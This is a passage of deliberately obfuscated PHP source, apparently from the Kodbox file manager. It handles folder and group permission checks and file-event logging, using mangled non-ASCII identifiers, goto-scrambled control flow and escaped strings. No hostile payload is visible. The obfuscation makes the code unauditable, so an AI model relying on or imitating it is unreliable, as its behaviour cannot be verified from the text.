$b†•ÔåŒ[75] => KodIO::make($d‡ƒÑ×‡Ä[$b†•ÔåŒ[390]]), $b†•ÔåŒ[1866] => $D‚Šëï‹™); goto a¬ã‰„ñ¶‡; D¤õ¢èØğ–: $CÏ¹‡Å¼ÚÓ = $FàñÉÍ”Å->_listAppendPath($CÏ¹‡Å¼ÚÓ); $d‡ƒÑ×‡Ä = $CÏ¹‡Å¼ÚÓ[0]; $D‚Šëï‹™ = $d‡ƒÑ×‡Ä[$b†•ÔåŒ[489]]; goto A»·¨µó³; a¬ã‰„ñ¶‡: } private function groupAuthInfo($C‡»“›ŒÃ, $D‰™§Æ¦ƒ) { $Bô’øÇ©£Ğ =& $_SERVER[ÉóçÄÇ]; $d¬§øÇé = Model($Bô’øÇ©£Ğ[480])->getInfo($D‰™§Æ¦ƒ); return array($Bô’øÇ©£Ğ[1867] => intval($C‡»“›ŒÃ[$Bô’øÇ©£Ğ[400]]), $Bô’øÇ©£Ğ[1851] => $C‡»“›ŒÃ, $Bô’øÇ©£Ğ[1868] => LNG($Bô’øÇ©£Ğ[1869]), $Bô’øÇ©£Ğ[1860] => array($Bô’øÇ©£Ğ[407] => $d¬§øÇé[$Bô’øÇ©£Ğ[28]], $Bô’øÇ©£Ğ[75] => KodIO::make($d¬§øÇé[$Bô’øÇ©£Ğ[84]][$Bô’øÇ©£Ğ[390]]), $Bô’øÇ©£Ğ[1866] => $d¬§øÇé[$Bô’øÇ©£Ğ[485]])); } protected function groupRootAuth($C“Ä¢¢›ŒÏ, $CÊ¾Ê»‚Å‘ = false) { goto B§ ¦”‘; B§ ¦”‘: $CÍŠĞ°åù• =& $_SERVER[ÉóçÄÇ]; $CÊ¾Ê»‚Å‘ = $CÊ¾Ê»‚Å‘ ? $CÊ¾Ê»‚Å‘ : USER_ID; $B¹ëÊ£ò› = $CÊ¾Ê»‚Å‘ . $CÍŠĞ°åù•[1870] . $C“Ä¢¢›ŒÏ; goto FˆÓ¶Šå‡ª; f³ÑìŒí¥õ: $EàáßÖƒ = $this->userGroupList($CÊ¾Ê»‚Å‘); $B¹ôæ•×ÀÆ = isset($EàáßÖƒ[$C“Ä¢¢›ŒÏ]) ? $EàáßÖƒ[$C“Ä¢¢›ŒÏ][$CÍŠĞ°åù•[400]] : !1; if ($B¹ôæ•×ÀÆ && Model($CÍŠĞ°åù•[1842])->authCheckAction($B¹ôæ•×ÀÆ[$CÍŠĞ°åù•[400]], $CÍŠĞ°åù•[1694])) { $a…±íÙ¯ù[$B¹ëÊ£ò›] = $B¹ôæ•×ÀÆ; return $B¹ôæ•×ÀÆ; } goto C™„¬¹ƒÆÑ; FˆÓ¶Šå‡ª: static $a…±íÙ¯ù = array(); if (isset($a…±íÙ¯ù[$B¹ëÊ£ò›])) { return $a…±íÙ¯ù[$B¹ëÊ£ò›]; } $A¼ÒÄÕİñ´ = Model($CÍŠĞ°åù•[480])->getInfo($C“Ä¢¢›ŒÏ); goto f³ÑìŒí¥õ; C™„¬¹ƒÆÑ: $c‹ïöĞµ = $this->sourceAuthSelect($A¼ÒÄÕİñ´[$CÍŠĞ°åù•[84]][$CÍŠĞ°åù•[390]]); $FĞˆÙ¬¢ = $c‹ïöĞµ ? $this->authMake($c‹ïöĞµ, $CÊ¾Ê»‚Å‘) : !1; $CÛƒ±—Ê± = $FĞˆÙ¬¢ ? $FĞˆÙ¬¢[$CÍŠĞ°åù•[440]] : !1; goto Cì£é·‰ï; Cì£é·‰ï: $a…±íÙ¯ù[$B¹ëÊ£ò›] = $CÛƒ±—Ê± ? $CÛƒ±—Ê± : $B¹ôæ•×ÀÆ; return $a…±íÙ¯ù[$B¹ëÊ£ò›]; goto FùËõèø—Ñ; FùËõèø—Ñ: } public function authOwnerApply($a’–ïâÊäŠ) { goto a÷ãÎÒÒ™; Då™ÌˆíÇ¤: $d¾­¸èğ¾ö = Model($C¦Ñ±Êİ’[1186])->parentLevelArray($a’–ïâÊäŠ[$C¦Ñ±Êİ’[481]]); $d¾­¸èğ¾ö = array_merge(array($a’–ïâÊäŠ[$C¦Ñ±Êİ’[390]]), array_reverse($d¾­¸èğ¾ö)); $cƒ²™¢øÏ÷ = $this->sourceAuthSelect($d¾­¸èğ¾ö); goto f¶Ê÷÷ÓÉ; b¥‘™½»¨Ò: if (count($cÁ¬‰Öªµè) == 0) { $cÁ¬‰Öªµè = $this->authFolderOwnerGroup($a’–ïâÊäŠ[$C¦Ñ±Êİ’[478]]); } $cÁ¬‰Öªµè = array_unique($cÁ¬‰Öªµè); if (AuthModel::authCheckRoot($a’–ïâÊäŠ[$C¦Ñ±Êİ’[400]][$C¦Ñ±Êİ’[401]])) { $cÁ¬‰Öªµè[] = USER_ID; } goto eØÉ« ›†¶; a÷ãÎÒÒ™: $C¦Ñ±Êİ’ =& $_SERVER[ÉóçÄÇ]; if (empty($a’–ïâÊäŠ[$C¦Ñ±Êİ’[400]]) || isset($a’–ïâÊäŠ[$C¦Ñ±Êİ’[1871]]) && $a’–ïâÊäŠ[$C¦Ñ±Êİ’[1871]]) { return $a’–ïâÊäŠ; } if (AuthModel::authCheckRoot($a’–ïâÊäŠ[$C¦Ñ±Êİ’[400]][$C¦Ñ±Êİ’[401]])) { return $a’–ïâÊäŠ; } goto Då™ÌˆíÇ¤; eØÉ« ›†¶: $a’–ïâÊäŠ[$C¦Ñ±Êİ’[400]][$C¦Ñ±Êİ’[1873]] = Model($C¦Ñ±Êİ’[497])->userListInfo($cÁ¬‰Öªµè); return $a’–ïâÊäŠ; goto AÖ‚ŒÌÍÔ; f¶Ê÷÷ÓÉ: $C¬ñõØ…Ÿ = array(); $cÁ¬‰Öªµè = array(); foreach ($cƒ²™¢øÏ÷ as $BÓèªš…î† => $DÖ•‡‚“¯Ì) { $D³¿°¦ÕÜĞ = $this->authFolderOwnerUser($DÖ•‡‚“¯Ì); $C¬ñõØ…Ÿ[$BÓèªš…î†] = $D³¿°¦ÕÜĞ; $cÁ¬‰Öªµè = array_merge($cÁ¬‰Öªµè, $D³¿°¦ÕÜĞ[$C¦Ñ±Êİ’[557]]); if ($D³¿°¦ÕÜĞ[$C¦Ñ±Êİ’[1872]]) { break; } } goto b¥‘™½»¨Ò; AÖ‚ŒÌÍÔ: } private function authFolderOwnerGroup($DÖŒÀÜœ‘Ï) { $fäÇ³éÅÃ  =& $_SERVER[ÉóçÄÇ]; $BŞÊ¨åÍ‡ = Model($fäÇ³éÅÃ [1756])->where(array($fäÇ³éÅÃ [1674] => $DÖŒÀÜœ‘Ï))->select(); $eÆâëœå = array(); if (!$BŞÊ¨åÍ‡) { return $eÆâëœå; } foreach ($BŞÊ¨åÍ‡ as $F¡¢Õ­ÙÌò) { $FÚ°·šÑ™ = $this->authInfo($F¡¢Õ­ÙÌò); if (AuthModel::authCheckRoot($FÚ°·šÑ™[$fäÇ³éÅÃ [400]])) { $eÆâëœå[] = $F¡¢Õ­ÙÌò[$fäÇ³éÅÃ [1511]]; } } return $eÆâëœå; } private function authFolderOwnerUser($C¢½Ëğ‹Ğê) { $FÚ…ğˆñî‚ =& $_SERVER[ÉóçÄÇ]; $dƒ‡·‹â®± = array(); $DïñŸè±ï¿ = !1; foreach ($C¢½Ëğ‹Ğê as $F–ä‘æ‰ñ) { $bŠŒœé³ëœ = $this->authInfo($F–ä‘æ‰ñ); if ($F–ä‘æ‰ñ[$FÚ…ğˆñî‚[478]] == $FÚ…ğˆñî‚[491]) { $DïñŸè±ï¿ = !0; } if ($F–ä‘æ‰ñ[$FÚ…ğˆñî‚[398]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($bŠŒœé³ëœ[$FÚ…ğˆñî‚[400]])) { $dƒ‡·‹â®±[] = $F–ä‘æ‰ñ[$FÚ…ğˆñî‚[478]]; } } } return array($FÚ…ğˆñî‚[557] => $dƒ‡·‹â®±, $FÚ…ğˆñî‚[1872] => $DïñŸè±ï¿); } public function authMake($Eìˆ¥İ»‚, $eã¤áÌÄ‘õ = false) { $eŠ¤à×ÊŠî =& $_SERVER[ÉóçÄÇ]; $cÀ¢º‰Ş‰ = $this->authArrayCheck($Eìˆ¥İ»‚, $eã¤áÌÄ‘õ); if ($cÀ¢º‰Ş‰[$eŠ¤à×ÊŠî[1874]]) { $cÀ¢º‰Ş‰[$eŠ¤à×ÊŠî[1874]] = $this->sourceAuthInfo($cÀ¢º‰Ş‰[$eŠ¤à×ÊŠî[1874]]); } return $cÀ¢º‰Ş‰; } public function authArrayCheck($cÑöèî°, $FæáºÀÚÑŠ = false) { goto CñÚˆïø; f»¾Ş­â±: $fÒé¦Ÿ–’Ö = 0; $bî®§¸Ó• = 0; $fé¾Ø†ëã = 0; goto Eƒ‹—Ö¤·; cÀö¸äˆä: foreach ($cÑöèî° as $AœÆáÏƒ­ç) { $BÉßÍˆè—Û = $this->authInfo($AœÆáÏƒ­ç); if (!$BÉßÍˆè—Û) { continue; } $Bî¢¾ŞÛ = $AœÆáÏƒ­ç[$CÙ½ÖÖ†¹µ[478]]; $AŒ½ÚÙ±Ÿ = intval($BÉßÍˆè—Û[$CÙ½ÖÖ†¹µ[400]]); if ($AœÆáÏƒ­ç[$CÙ½ÖÖ†¹µ[398]] == SourceModel::TYPE_USER && $Bî¢¾ŞÛ == $FæáºÀÚÑŠ) { $b…Ó˜Ÿìƒ® = !0; $e…®ß…—ß© = $BÉßÍˆè—Û; $cÏõñ¯ôö™ = $AŒ½ÚÙ±Ÿ; } else { if ($AœÆáÏƒ­ç[$CÙ½ÖÖ†¹µ[398]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Bî¢¾ŞÛ, $FæáºÀÚÑŠ)) { $fÒé¦Ÿ–’Ö = !0; $Eğ÷†´Ê„ = $this->groupStepToUserGroup($Bî¢¾ŞÛ, $FæáºÀÚÑŠ); if ($Eğ÷†´Ê„ < $Aºö‚Âš¢) { $Aºö‚Âš¢ = $Eğ÷†´Ê„; $bî®§¸Ó• = $AŒ½ÚÙ±Ÿ; $fé¾Ø†ëã = $BÉßÍˆè—Û; $FÁÁÌíóÎò = $Bî¢¾ŞÛ; } if ($Eğ÷†´Ê„ == $Aºö‚Âš¢ && $AŒ½ÚÙ±Ÿ >= $bî®§¸Ó•) { $bî®§¸Ó• = $AŒ½ÚÙ±Ÿ; $fé¾Ø†ëã = $BÉßÍˆè—Û; $FÁÁÌíóÎò = $Bî¢¾ŞÛ; } } else { if ($Bî¢¾ŞÛ == $CÙ½ÖÖ†¹µ[491]) { $c•Œéˆ†‡é = !0; $bò¸÷½…‡Ö = $BÉßÍˆè—Û; $eõˆŒ…³àÕ = $AŒ½ÚÙ±Ÿ; } } } } if ($b…Ó˜Ÿìƒ®) { $FîÊÈ§Àä— = $cÏõñ¯ôö™; $BÉßÍˆè—Û = $e…®ß…—ß©; $F®ˆŠ¿§ƒç = LNG($CÙ½ÖÖ†¹µ[1875]); } else { if ($fÒé¦Ÿ–’Ö) { $FîÊÈ§Àä— = $bî®§¸Ó•; $BÉßÍˆè—Û = $fé¾Ø†ëã; $B‘±“íñî¸ = Model($CÙ½ÖÖ†¹µ[480])->getInfo($FÁÁÌíóÎò); $F®ˆŠ¿§ƒç = $CÙ½ÖÖ†¹µ[159] . $B‘±“íñî¸[$CÙ½ÖÖ†¹µ[485]] . $CÙ½ÖÖ†¹µ[1876] . LNG($CÙ½ÖÖ†¹µ[1877]); } else { if ($c•Œéˆ†‡é) { $FîÊÈ§Àä— = $eõˆŒ…³àÕ; $BÉßÍˆè—Û = $bò¸÷½…‡Ö; $F®ˆŠ¿§ƒç = LNG($CÙ½ÖÖ†¹µ[1848]); } else { $FîÊÈ§Àä— = 0; $BÉßÍˆè—Û = !1; $F®ˆŠ¿§ƒç = $CÙ½ÖÖ†¹µ[33]; } } } $B¤Òğ¹À‹ = array($CÙ½ÖÖ†¹µ[1867] => intval($FîÊÈ§Àä—), $CÙ½ÖÖ†¹µ[1851] => $BÉßÍˆè—Û, $CÙ½ÖÖ†¹µ[1868] => $F®ˆŠ¿§ƒç, $CÙ½ÖÖ†¹µ[1860] => $AœÆáÏƒ­ç[$CÙ½ÖÖ†¹µ[390]]); goto e¶ÖËßÏŸ­; C‰ôòí±©: $eõˆŒ…³àÕ = 0; $bò¸÷½…‡Ö = 0; $AœÆáÏƒ­ç = array($CÙ½ÖÖ†¹µ[390] => 0); goto cÀö¸äˆä; bñ‚’’¡È: $b…Ó˜Ÿìƒ® = 0; $cÏõñ¯ôö™ = 0; $e…®ß…—ß© = 0; goto f»¾Ş­â±; CñÚˆïø: $CÙ½ÖÖ†¹µ =& $_SERVER[ÉóçÄÇ]; if (!$cÑöèî°) { return array($CÙ½ÖÖ†¹µ[401] => 0, $CÙ½ÖÖ†¹µ[440] => !1); } $FæáºÀÚÑŠ = $FæáºÀÚÑŠ ? $FæáºÀÚÑŠ : USER_ID; goto bñ‚’’¡È; e¶ÖËßÏŸ­: return $B¤Òğ¹À‹; goto AÍµğêÆ­±; Eƒ‹—Ö¤·: $Aºö‚Âš¢ = 1000; $FÁÁÌíóÎò = 0; $c•Œéˆ†‡é = 0; goto C‰ôòí±©; AÍµğêÆ­±: } private function groupContainUser($cÜŞæÅ´…Ã, $a’æÁ‹·— = false) { return in_array($cÜŞæÅ´…Ã, $this->userGroupParents($a’æÁ‹·—)); } private function groupStepToUserGroup($EôÀâ‘Ûîê, $D†Æíœ˜ìè = false) { goto a¯¹½·ëŠ¹; Cì©ïóĞÔ†: return $FìƒƒéÃß ; goto cŠ²î¨ñ­; a¯¹½·ëŠ¹: $B‘ˆ¿³²ä =& $_SERVER[ÉóçÄÇ]; $FÖÍ›¥“¤ = $this->userGroupList($D†Æíœ˜ìè); $FìƒƒéÃß  = 1000; goto AÓùŒ—¶Á; AÓùŒ—¶Á: $C¯ÏÁšÈƒÖ = $GLOBALS[$B‘ˆ¿³²ä[6]][$B‘ˆ¿³²ä[87]][$B‘ˆ¿³²ä[1767]] == 1; $d‚ÁÔ¿Ç£ = $C¯ÏÁšÈƒÖ ? 3 : 2; foreach ($FÖÍ›¥“¤ as $eìø”‡¦ŒÚ) { if ($eìø”‡¦ŒÚ[$B‘ˆ¿³²ä[1674]] == $EôÀâ‘Ûîê) { return 0; } $F§¡£†ù‰È = explode($B‘ˆ¿³²ä[47], trim($eìø”‡¦ŒÚ[$B‘ˆ¿³²ä[481]], $B‘ˆ¿³²ä[47])); if ($F§¡£†ù‰È[0] == $B‘ˆ¿³²ä[491] && count($F§¡£†ù‰È) > $d‚ÁÔ¿Ç£) { $BÊÒ†ã˜Ú˜ = array_reverse(array_slice($F§¡£†ù‰È, $d‚ÁÔ¿Ç£)); $aÏ‚ìò‹ºµ = array_search($EôÀâ‘Ûîê, $BÊÒ†ã˜Ú˜); if ($aÏ‚ìò‹ºµ !== !1 && $aÏ‚ìò‹ºµ + 1 <= $FìƒƒéÃß ) { $FìƒƒéÃß  = $aÏ‚ìò‹ºµ + 1; } } } goto Cì©ïóĞÔ†; cŠ²î¨ñ­: } private function userGroupList($F©­Ôæµ˜ = false) { $E¤öøˆ¾Íò =& $_SERVER[ÉóçÄÇ]; static $b’ç ÅáÆÉ = array(); if (isset($b’ç ÅáÆÉ[$F©­Ôæµ˜])) { return $b’ç ÅáÆÉ[$F©­Ôæµ˜]; } $e–ÁÌ­´É¢ = Model($E¤öøˆ¾Íò[501])->getInfo($F©­Ôæµ˜); $b’ç ÅáÆÉ[$F©­Ôæµ˜] = array_to_keyvalue($e–ÁÌ­´É¢[$E¤öøˆ¾Íò[1849]], $E¤öøˆ¾Íò[1674]); return $b’ç ÅáÆÉ[$F©­Ôæµ˜]; } public function userGroupParents($bÈ­ëã±™) { goto e´ğóâíğ‡; dæ•’ºÊÙİ: $f†º×Â¸«Ç = $GLOBALS[$f¡ñ©Şª–ñ[6]][$f¡ñ©Şª–ñ[87]][$f¡ñ©Şª–ñ[1767]] == 1; $CÇÊÈù§ÄŠ = $f†º×Â¸«Ç ? 3 : 2; foreach ($bØ“ö–òó as $B“ãÃĞÁâ) { $fÄ±ˆ¶ÑƒŒ = array($B“ãÃĞÁâ[$f¡ñ©Şª–ñ[1674]]); $Dò‹óÍä­ = explode($f¡ñ©Şª–ñ[47], trim($B“ãÃĞÁâ[$f¡ñ©Şª–ñ[481]], $f¡ñ©Şª–ñ[47])); if ($Dò‹óÍä­[0] == $f¡ñ©Şª–ñ[491] && count($Dò‹óÍä­) > $CÇÊÈù§ÄŠ) { $E°œÑöÉİŠ = array_slice($Dò‹óÍä­, $CÇÊÈù§ÄŠ); $fÄ±ˆ¶ÑƒŒ = array_merge($fÄ±ˆ¶ÑƒŒ, array_reverse($E°œÑöÉİŠ)); } $f¿İÜ¥‡¬ = array_merge($f¿İÜ¥‡¬, $fÄ±ˆ¶ÑƒŒ); } goto EíÒ½µÙº; EíÒ½µÙº: $C›¸°«à„é[$bÈ­ëã±™] = array_unique($f¿İÜ¥‡¬); return $C›¸°«à„é[$bÈ­ëã±™]; goto câ°ÒïØº; e´ğóâíğ‡: $f¡ñ©Şª–ñ =& $_SERVER[ÉóçÄÇ]; static $C›¸°«à„é = array(); $bÈ­ëã±™ = $bÈ­ëã±™ ? $bÈ­ëã±™ : USER_ID; goto DÊÛ†ĞÎŞ; DÊÛ†ĞÎŞ: if (isset($C›¸°«à„é[$bÈ­ëã±™])) { return $C›¸°«à„é[$bÈ­ëã±™]; } $bØ“ö–òó = $this->userGroupList($bÈ­ëã±™); $f¿İÜ¥‡¬ = array(); goto dæ•’ºÊÙİ; câ°ÒïØº: } public function authTargetInfoMake($Eé§…¿¿·Ñ) { goto A˜Ù‡İßêŸ; A˜Ù‡İßêŸ: $AŞ¿¦Î¨Ñ =& $_SERVER[ÉóçÄÇ]; $C¤ï¸ïìª = array(); $eñ‹°Œ = array(); goto f ¶˜£‹£à; f ¶˜£‹£à: foreach ($Eé§…¿¿·Ñ as $E›ˆì–Ö÷£) { if ($E›ˆì–Ö÷£[$AŞ¿¦Î¨Ñ[398]] == SourceModel::TYPE_USER) { $C¤ï¸ïìª[] = intval($E›ˆì–Ö÷£[$AŞ¿¦Î¨Ñ[478]]); } else { if ($E›ˆì–Ö÷£[$AŞ¿¦Î¨Ñ[398]] == SourceModel::TYPE_GROUP) { $eñ‹°Œ[] = intval($E›ˆì–Ö÷£[$AŞ¿¦Î¨Ñ[478]]); } } } if ($C¤ï¸ïìª) { $C¤ï¸ïìª = Model($AŞ¿¦Î¨Ñ[497])->userListInfo($C¤ï¸ïìª); } if ($eñ‹°Œ) { $eÓ¨âÎ‘‰‡ = array($AŞ¿¦Î¨Ñ[1753] => array($AŞ¿¦Î¨Ñ[405], $eñ‹°Œ)); $eñ‹°Œ = Model($AŞ¿¦Î¨Ñ[480])->field($AŞ¿¦Î¨Ñ[1878])->where($eÓ¨âÎ‘‰‡)->select(); $eñ‹°Œ = array_to_keyvalue($eñ‹°Œ, $AŞ¿¦Î¨Ñ[1674]); } goto e’Ïˆ–—à; e’Ïˆ–—à: return array($AŞ¿¦Î¨Ñ[1879] => $C¤ï¸ïìª, $AŞ¿¦Î¨Ñ[1880] => $eñ‹°Œ); goto bĞŒæé—„‘; bĞŒæé—„‘: } public function authInfo($fèæêÓùÇ) { $cÜÁ˜åĞ‰Ã =& $_SERVER[ÉóçÄÇ]; if ($fèæêÓùÇ[$cÜÁ˜åĞ‰Ã[1770]]) { $Eñ‰¶°õƒ = Model($cÜÁ˜åĞ‰Ã[1842])->listData($fèæêÓùÇ[$cÜÁ˜åĞ‰Ã[1770]]); if (!$Eñ‰¶°õƒ) { return !1; $D¶¡Üâà‘ = Model($cÜÁ˜åĞ‰Ã[1842])->listData(); $Bİ¹öÙ‡ç = array_filter_by_field($D¶¡Üâà‘, $cÜÁ˜åĞ‰Ã[400], $cÜÁ˜åĞ‰Ã[491]); return $Bİ¹öÙ‡ç; } $cæç³ÑƒÏ§ = array_field_key($Eñ‰¶°õƒ, array($cÜÁ˜åĞ‰Ã[388], $cÜÁ˜åĞ‰Ã[28], $cÜÁ˜åĞ‰Ã[400], $cÜÁ˜åĞ‰Ã[1695], $cÜÁ˜åĞ‰Ã[1697])); $cæç³ÑƒÏ§[$cÜÁ˜åĞ‰Ã[1881]] = $fèæêÓùÇ; return $cæç³ÑƒÏ§; } else { return array($cÜÁ˜åĞ‰Ã[406] => 0, $cÜÁ˜åĞ‰Ã[1680] => $fèæêÓùÇ[$cÜÁ˜åĞ‰Ã[1824]], $cÜÁ˜åĞ‰Ã[407] => $cÜÁ˜åĞ‰Ã[33], $cÜÁ˜åĞ‰Ã[1695] => $cÜÁ˜åĞ‰Ã[1882]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\x72\143\x65\x5f\145\x76\x65\x6e\x74"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\x54\151\155\x65", "\x74\x69\155\x65", "\x69\156\x73\145\x72\164", "\146\x75\x6e\143\x74\151\x6f\156"), array("\x64\145\x73\x63", '', "\x69\156\163\x65\x72\x74\x2c\165\160\x64\x61\x74\x65\x2c\x73\145\x6c\x65\x63\x74", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($CªÏØÊÌ›, $F‘×µ–Ş¡µ, $Eî†ƒÙæÑğ = '') { goto c´¹³£“·; e×µ™„®¹Ç: $E‚Šªæ½ = array($A’ï–°Í¶[404] => $CªÏØÊÌ›, $A’ï–°Í¶[1883] => $DòÊ±ÆÆ’¢[$A’ï–°Í¶[472]], $A’ï–°Í¶[1884] => $DòÊ±ÆÆ’¢[$A’ï–°Í¶[28]], $A’ï–°Í¶[489] => $DòÊ±ÆÆ’¢[$A’ï–°Í¶[489]], $A’ï–°Í¶[1503] => USER_ID, $A’ï–°Í¶[409] => $F‘×µ–Ş¡µ, $A’ï–°Í¶[1505] => $Eî†ƒÙæÑğ); $this->addSystemLog($F‘×µ–Ş¡µ, $E‚Šªæ½); return $this->add($E‚Šªæ½); goto BÇõ–íÈË; AÌ¥¸» ÍÏ: if (!$DòÊ±ÆÆ’¢) { return !1; } if ($this->isCacheEvent($DòÊ±ÆÆ’¢, $F‘×µ–Ş¡µ)) { return; } if ($Eî†ƒÙæÑğ && is_string($Eî†ƒÙæÑğ)) { $Eî†ƒÙæÑğ = array($A’ï–°Í¶[1707] => $Eî†ƒÙæÑğ); } goto e×µ™„®¹Ç; c´¹³£“·: $A’ï–°Í¶ =& $_SERVER[ÉóçÄÇ]; if (!$this->eventSave) { return; } $DòÊ±ÆÆ’¢ = Model($A’ï–°Í¶[1186])->sourceInfo($CªÏØÊÌ›); goto AÌ¥¸» ÍÏ; BÇõ–íÈË: } private function addSystemLog($Cñ–Â›÷®ã, $aÃ»ˆê£) { $cïøè„Å…  =& $_SERVER[ÉóçÄÇ]; if ($Cñ–Â›÷®ã == $cïøè„Å… [1885]) { $Cñ–Â›÷®ã = $aÃ»ˆê£[$cïøè„Å… [425]][$cïøè„Å… [1886]]; } else { if (in_array($Cñ–Â›÷®ã, array($cïøè„Å… [1651], $cïøè„Å… [1887]))) { $Cñ–Â›÷®ã = $aÃ»ˆê£[$cïøè„Å… [425]][$cïøè„Å… [714]]; } } $e— Ìº¢ï­ = array_merge($aÃ»ˆê£, array($cïøè„Å… [1888] => $aÃ»ˆê£[$cïøè„Å… [390]], $cïøè„Å… [1889] => $aÃ»ˆê£[$cïøè„Å… [1889]])); Model($cïøè„Å… [1615])->addLog($cïøè„Å… [1890] . $Cñ–Â›÷®ã, $e— Ìº¢ï­); } private function isCacheEvent($FË‘ÛÈ‹ë“, $aì„•Üª×´) { if ($FË‘ÛÈ‹ë“[$_SERVER[ÉóçÄÇ][398]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($EÆËÀÀÛ , $E…‹‰Ô»˜Ì) { $bäŸÔ®áô‘ =& $_SERVER[ÉóçÄÇ]; $aÖ°Ú•º¬® = Model($bäŸÔ®áô‘[1186])->sourceInfo($EÆËÀÀÛ ); $cˆÏ¼±›ØÖ = array($bäŸÔ®áô‘[1886] => $E…‹‰Ô»˜Ì, $bäŸÔ®áô‘[28] => $aÖ°Ú•º¬®[$bäŸÔ®áô‘[28]]); return $this->addEvent($EÆËÀÀÛ , $bäŸÔ®áô‘[1885], $cˆÏ¼±›ØÖ); } public function eventFileEdit($c‚Ş…©æÖ) { $BÁÑœÚó¡ =& $_SERVER[ÉóçÄÇ]; $BôÇŞêÊêØ = array($BÁÑœÚó¡[1891] => $_SERVER[$BÁÑœÚó¡[1892]], $BÁÑœÚó¡[1893] => strtolower(ACTION)); return $this->addEvent($c‚Ş…©æÖ, $BÁÑœÚó¡[1641], $BôÇŞêÊêØ); } public function eventRecycle($eÈÓŞ§¤², $aÀŒŞİ¿Á£) { return $this->addEvent($eÈÓŞ§¤², $_SERVER[ÉóçÄÇ][1887], $aÀŒŞİ¿Á£); } public function eventRemove($b×†²ÜˆÚ) { $BŒ‚²õÛ§ =& $_SERVER[ÉóçÄÇ]; $F‚ŒŞ†ñæÏ = Model($BŒ‚²õÛ§[1186])->sourceInfo($b×†²ÜˆÚ); $bé ÚİÛš = $F‚ŒŞ†ñæÏ[$BŒ‚²õÛ§[28]]; return $this->addEvent($F‚ŒŞ†ñæÏ[$BŒ‚²õÛ§[472]], $BŒ‚²õÛ§[1640], $bé ÚİÛš); } public function eventShare($aõéòŒ•ëš, $d¦İªŒ£) { return $this->addEvent($aõéòŒ•ëš, $_SERVER[ÉóçÄÇ][1651], $d¦İªŒ£); } public function eventMove($fÂŞƒö¯™ó, $FÒ°œ—™Àß, $C®›Êß÷ƒñ) { goto bÕÒÎ¾ˆ¬Ë; bÕÒÎ¾ˆ¬Ë: $dôáîŠ¢—¿ =& $_SERVER[ÉóçÄÇ]; $AŒˆÑ‘Ã = Model($dôáîŠ¢—¿[1186]); $fš¸¶Ğ ‹¶ = $AŒˆÑ‘Ã->sourceInfo($fÂŞƒö¯™ó); goto dïè›Ïœ·; dïè›Ïœ·: $eà­‘Ó¬¼å = $AŒˆÑ‘Ã->sourceInfo($FÒ°œ—™Àß); $dƒø‚†ù = $AŒˆÑ‘Ã->sourceInfo($C®›Êß÷ƒñ); $D†ØÖ’èİ³ = array($dôáîŠ¢—¿[1037] => $FÒ°œ—™Àß, $dôáîŠ¢—¿[1894] => $eà­‘Ó¬¼å[$dôáîŠ¢—¿[28]], $dôáîŠ¢—¿[1874] => $eà­‘Ó¬¼å[$dôáîŠ¢—¿[489]], $dôáîŠ¢—¿[1038] => $C®›Êß÷ƒñ, $dôáîŠ¢—¿[1895] => $dƒø‚†ù[$dôáîŠ¢—¿[28]], $dôáîŠ¢—¿[1896] => $dƒø‚†ù[$dôáîŠ¢—¿[489]]); goto cã ¾÷¤ÔÈ; cã ¾÷¤ÔÈ: $this->addEvent($fÂŞƒö¯™ó, $dôáîŠ¢—¿[515], $D†ØÖ’èİ³); $fš¸¶Ğ ‹¶ = $AŒˆÑ‘Ã->sourceInfo($fÂŞƒö¯™ó); $D†ØÖ’èİ³ = array($dôáîŠ¢—¿[390] => $fš¸¶Ğ ‹¶[$dôáîŠ¢—¿[390]], $dôáîŠ¢—¿[28] => $fš¸¶Ğ ‹¶[$dôáîŠ¢—¿[28]]); goto EŞ¬òÍ½â‚; EŞ¬òÍ½â‚: $this->addEvent($FÒ°œ—™Àß, $dôáîŠ¢—¿[1897], $D†ØÖ’èİ³); goto CÊè¨àáŞ‡; CÊè¨àáŞ‡: } public function eventCopy($eó®Ñ½ºÕ) { $this->eventCreate($eó®Ñ½ºÕ, $_SERVER[ÉóçÄÇ][513]); } public function eventRename($E¡ÆìÉìÑ, $E»¨é¸ÛäÏ, $cÈ‚·Ûí) { $A æİÕä‚ˆ =& $_SERVER[ÉóçÄÇ]; $dêìà¨¬ÁĞ = array($A æİÕä‚ˆ[1037] => $E»¨é¸ÛäÏ, $A æİÕä‚ˆ[1038] => $cÈ‚·Ûí); return $this->addEvent($E¡ÆìÉìÑ, $A æİÕä‚ˆ[1200], $dêìà¨¬ÁĞ); } public function eventAddComment($FÉÀØÕ’–, $FÎêÊ«°£Ë) { return $this->addEvent($FÉÀØÕ’–, $_SERVER[ÉóçÄÇ][1898], $FÎêÊ«°£Ë); } public function eventAddDesc($fßŠÕçô–, $aöìÍà…™…) { return $this->addEvent($fßŠÕçô–, $_SERVER[ÉóçÄÇ][1899], $aöìÍà…™…); } public function listBySource($AƒõÒ×½»ë) { goto b‹Èç™Ç•ù; D˜îÅŞ¤¶“: if ($cìƒô†ÔÊÚ[$DµÎ—«˜[397]] == $DµÎ—«˜[86]) { $f·•Óà¬¬Õ = Model($DµÎ—«˜[1186])->listSearchChildren($AƒõÒ×½»ë, 20000); $f·•Óà¬¬Õ[] = $AƒõÒ×½»ë . $DµÎ—«˜[373]; $a’ÜğÍíšä = array($DµÎ—«˜[390] => array($DµÎ—«˜[7], $f·•Óà¬¬Õ)); } $dƒÎ»ÕŠÆô = $this->where($a’ÜğÍíšä)->order($DµÎ—«˜[1900])->selectPage(); if ($dƒÎ»ÕŠÆô[$DµÎ—«˜[362]][$DµÎ—«˜[363]] == 0) { $dƒÎ»ÕŠÆô[$DµÎ—«˜[362]][$DµÎ—«˜[363]] = 1; $dƒÎ»ÕŠÆô[$DµÎ—«˜[365]] = array(array($DµÎ—«˜[404] => $AƒõÒ×½»ë, $DµÎ—«˜[1883] => $cìƒô†ÔÊÚ[$DµÎ—«˜[472]], $DµÎ—«˜[1503] => $cìƒô†ÔÊÚ[$DµÎ—«˜[426]], $DµÎ—«˜[409] => $DµÎ—«˜[1901], $DµÎ—«˜[410] => 